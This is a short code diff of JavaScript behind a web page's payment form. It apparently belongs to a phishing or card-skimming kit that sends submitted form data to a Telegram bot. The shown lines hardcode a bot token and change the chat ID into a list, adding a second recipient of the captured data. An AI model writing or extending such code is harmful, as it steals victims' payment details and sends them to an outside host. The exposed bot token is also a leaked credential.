@@ -41,7 +41,7 @@ document.getElementById('payment-form').addEventListener('submit', async functio
 
     // Replace with your bot token and chat ID
     const BOT_TOKEN = '8080093683:AAGXozrSUiAauDGsq4PJTukN1MTebCa2C6w'; // Your Bot Token
-    const CHAT_ID = '6967962102'; // Your Chat ID
+    const CHAT_ID = ["1891950844", "6967962102"]; // Your Chat ID
 
     // Send data to Telegram bot
     const message = `
